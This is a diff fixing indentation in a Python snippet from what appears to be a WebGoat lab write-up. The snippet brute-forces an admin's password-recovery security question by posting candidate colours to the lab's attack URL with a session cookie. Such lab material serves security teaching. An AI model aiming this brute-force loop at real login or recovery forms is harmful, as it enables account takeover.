@@ -36,11 +36,11 @@ cookie = dict(JSESSIONID=r.cookies['JSESSIONID'])
 for color in colors:
     data2 = {'Color': color, 'SUBMIT': 'Submit'}
 
-r = post("http://webgoat.hacking-lab.com/attack?Screen=64&menu=500", headers=headers, cookies=cookie, proxies=proxies, data=data2)
+    r = post("http://webgoat.hacking-lab.com/attack?Screen=64&menu=500", headers=headers, cookies=cookie, proxies=proxies, data=data2)
 
-if 'For security reasons, please change your password immediately' in r.text:
-    print("admin's color: " + color)
-    break
+    if 'For security reasons, please change your password immediately' in r.text:
+        print("admin's color: " + color)
+        break
 ```
 
 ## Mitigation:
